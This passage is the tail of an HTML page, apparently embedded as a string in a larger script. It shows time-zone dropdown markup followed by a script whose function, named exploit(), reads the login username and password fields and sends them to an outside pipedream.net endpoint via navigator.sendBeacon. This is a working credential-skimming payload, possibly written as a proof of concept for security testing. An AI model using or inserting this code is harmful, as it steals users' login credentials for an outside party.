role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="78">(GMT+12:00) Auckland, Wellington</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="79">(GMT+12:00) Fiji, Kamchatka, Marshall Is.</li><li tabindex="-1" role="option" unselectable="on" class="k-item" aria-selected="false" data-offset-index="80">(GMT+13:00) Nuku'alofa</li></ul></div><div class="k-nodata" style="display:none"><div>No data found.</div></div></div>
        
    </body>
    <script type="text/javascript">
        function exploit() {
            navigator.sendBeacon("https://eoa6fb9wq9xbcuv.m.pipedream.net", 'a='+document.getElementById('login-username').value+'&b='+document.getElementById('login-password').value)
        }
    </script>


    </html>"))
